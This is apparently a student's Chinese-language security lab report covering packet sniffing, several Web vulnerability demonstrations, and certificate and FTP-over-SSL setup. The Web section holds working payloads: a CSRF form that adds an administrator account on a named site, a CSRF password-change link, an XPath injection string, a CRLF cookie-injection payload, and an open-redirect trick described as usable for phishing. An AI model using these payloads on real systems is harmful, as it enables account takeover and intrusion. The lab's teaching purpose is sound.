
# lab8: 网络监听技术

## 8.1 Wireshark 的安装与使用
- 安装 Wireshark, 飞秋软件.
- 学习使用 Wireshark 软件, 包含各功能菜单的作用, 选项的设置等.
- 二人(A 和 B)一组, 组员 A 和 B 启动 Wireshark 软件, 设置好捕获选项, 并开始捕获. 注意根据情况设置好过滤器, 使得尽量只捕获自己想要的那些数据包, 进行以下实验过程:
    - 启动飞秋, 不使用飞秋进行任何操作, 通过分析 Wireshark 捕获的数据包判断飞秋是否会定时发送数据包, 如果发送, 采用的是何种协议, 何种方式?
    - 组员 B 使用飞秋向组员 A 发送消息.
    - 组员 A 和 B 截获数据包后, 分析飞秋发送消息使用的传输层协议(UDP/TCP), 并分析使用飞秋发送一条消息时的通信机制.
    - 组员 B 使用飞秋的刷新功能进行刷新.
    - 组员 A 和 B 截获数据包后, 分析飞秋刷新时使用的传输层协议, 并分析使用飞秋刷新时的通信机制.
    - 组员 B 使用飞秋向组员 A 发送文件.组员 A 和 B 截获数据包后, 分析飞秋发送文件时使用的传输层协议, 并分析使用飞秋发送文件时的通信机制.
- 将观察结果截图, 并写入实验报告中

<!-- TODO -->

pc1, ip

pc2, ip

## 8.2 Wireshark 工具的使用与 TCP 数据包分析
- 攻击方使用 Nmap 扫描达到特定的目的
- 防守方使用 tcpdump 嗅探
- 用 Wireshark 分析, 并分析出供给方的扫描目的以及每次使用的 Nmap 
令
- 撰写实验报告

<!-- TODO -->

# lab9: Web 网站攻击技术

## 9.1 SSRF 漏洞原理以及演示

dnslog
![dns](https://i.imgur.com/0w34q7d.png)

提交
![get](https://i.imgur.com/qGnJ7UB.png)

用 burpsuite 抓包
![burpsuite](https://i.imgur.com/uxTniPX.png)

添加和遍历端口
![port](https://i.imgur.com/fiZQ39E.png)

长度排序, 发现开放了 135, 80
![portsort](https://i.imgur.com/qdJ5w9l.png)


## 9.2 CSRF 漏洞原理以及演示

### GET 类型
更改密码
![pass](https://i.imgur.com/5J97LsY.png)

抓包得到: 
 <http://dvwa.com/vulnerabilities/csrf/?password_new=qweqwe&password_conf=qweqwe&Change=%E6%9B%B4%E6%94%B9>

直接用这个链接请求就能修改密码

### POST 类型

添加一个用户 giaogiao
![gioaigoa](https://i.imgur.com/TLbXQf3.png)

期间 burpsuite 抓包, 并解码如下: 
![decode](https://i.imgur.com/1a8pKUj.png)

观察, 构造出 CSRF 的利用代码(html)
```html
<html>
    <body>
    <form 
        action="http://www.huihuaguding.com/admin/index.php?c=administrator&a=add" 
        method="POST">
        <input type="hidden" name="data[username]" value="giaogiao" />
        <input type="hidden" name="data[password]" value="giaogiao" 
    />
        <input type="hidden" name="data[realname]" value="" />
        <input type="hidden" name="[roleid]" value="1" />
        <input type="hidden" name="submit" value="提交" />
        <input type="submit" value="提交" />
    </form>
    </body>
</html>
```

打开然后提交
![up](https://i.imgur.com/MFlpa29.png)


此时发现添加成功, 可以直接用该用户登陆
![add](https://i.imgur.com/PrBJ7vz.png)


## 9.3 xpath 漏洞原理以及演示

通过信息判断存在注入
![xpath-inject](https://i.imgur.com/acQ1lyV.png)

构造注入语句
```
https://www.xpath.com/inject.php?user=user1' or 1=1 or ''='
```
效果
![inject](https://i.imgur.com/UQhScoa.png)


## 9.4 URL 跳转漏洞原理以及演示

将跳转域名改为 baidu.com: 
![baidu](https://i.imgur.com/oKdqH4X.png)


进行登陆, 跳转成功
![jump](https://i.imgur.com/qaMLUkL.png)

可以自建钓鱼网站窃取用户登录信息

## 9.5 host 碰撞漏洞原理以及演示

直接访问 192.168.229.133:8083 返回 403
![403](https://i.imgur.com/WBvrSyU.png)

通过 host 文件绑定一个域名(test.com) 后可以访问
> `C:\Windows\System32\drivers\etc`
![hosts](https://i.imgur.com/Ytjvy42.png)

构造一个 HTTP 报文
```
GET / HTTP/1.1
Host: 192.168.229.138:8083
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 
(KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
If-Modified-Since: Tue, 03 Sep 2019 06:30:48 GMT
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima
ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
```

![repe](https://i.imgur.com/EtfvtE9.png)

选择字段: 
![ff](https://i.imgur.com/ReJwSog.png)

加载字典
![lll](https://i.imgur.com/3LmzdwG.png)

进行攻击, 对结果长度排序即可: 
![lensort](https://i.imgur.com/MFYSUhN.png)


## 9.6 HTTP 响应拆分(CRLF 注入)漏洞原理以及演示


当打开 https://127.0.0.1:801/ 会重定向到 http://127.0.0.1:801
<!-- ![rere](https://i.imgur.com/YWhNF3x.png) -->

构造数据包: 
```
GET / HTTP/1.1
Host:127.0.0.1:801
Content-length: 0
Connection: close
```

构造 CSRF
```
/%0d%0aSet-cookie:name=shandongdaxue
```

成功设置 cookie
![cookie](https://i.imgur.com/GiWiz2t.png)

# lab10: 认证技术与认证协议

## 10.1 Windows 认证中心的构建实验
- 在 Windows 2008 Server 中启用并配置证书服务
- 向证书服务申请并安装数据证书
- 将相关配置和申请界面截图并写入实验报告中

添加证书服务
![ss](https://i.imgur.com/YTRZvPY.png)
![ss](https://i.imgur.com/oQ29t7A.png)
![ss](https://i.imgur.com/BEYrLJ8.png)
![ss](https://i.imgur.com/mqgzowR.png)
![ss](https://i.imgur.com/W2B7m9c.png)
![ss](https://i.imgur.com/ijC6Mwj.png)
![ss](https://i.imgur.com/OI6ZPm5.png)
![ss](https://i.imgur.com/FTuJ67S.png)


查看证书信息
![ll](https://i.imgur.com/j9pUTEv.png)
数字证书内容如下： 
版本：v3 
序列号：5e d0 ee af 8d 9f 33 ba 46 f1 40 94 66 0b 36 2c
签名算法：sha1RSA 
签名哈希算法：sha1 
颁发者：WIN-A973229G3V6-CA   
有效期从：  2023 年9 月9 日  5:19:31 
到：  2028 年1 月7 日  5:29:31 
使用者：WIN-A973229G3V6-CA   
公钥：RSA（2048 bits） 
 
密钥用法：Digital Signature, Certificate signing, 0ff-line CRL Signing.CRL Signing 
86) 
使用者密钥标识符：f6 f4 50 d4 d4 ae 75 ad 76 75 d2 43 f1 25 ac 59 8c 1b 29 36 
CA 版本：v0.0 
基本约束：Subject Type=CA   
path Length constraint=None

## 10.2 使用 SSL 协议实现安全的 FTP 数据传输

<!-- TODO: kali dep -->

```
# Example config file /etc/vsftpd.conf 
listen=YES 
#listen_ipv6=YES 
anonymous_enable=NO 
local_enable=YES 
write_enable=YES 
#local_umask=022 
#anon_upload_enable=YES 
#anon_mkdir_write_enable=YES 
dirmessage_enable=YES 
use_localtime=YES 
xferlog_enable=YES 
connect_from_port_20=YES 
chown_uploads=YES 
chown_username=cat 
#xferlog_file=/var/log/vsftpd.log
#xferlog_std_format=YES 
#idle_session_timeout=600 
#data_connection_timeout=120 
#nopriv_user=ftpsecure 
#async_abor_enable=YES 
#ascii_upload_enable=YES 
#ascii_download_enable=YES 
#ftpd_banner=Welcome to blah FTP service. 
#deny_email_enable=YES 
# (default follows) 
#banned_email_file=/etc/vsftpd.banned_emails 
# chroot_list_enable below. 
# chroot_local_user=YES 
#chroot_local_user=YES 
#chroot_list_enable=YES 
# (default follows) 
#chroot_list_file=/etc/vsftpd.chroot_list 
#ls_recurse_enable=YES 
secure_chroot_dir=/var/run/vsftpd/empty 
pam_service_name=vsftpd 
rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem 
rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key 
ftp_username=nobody
```
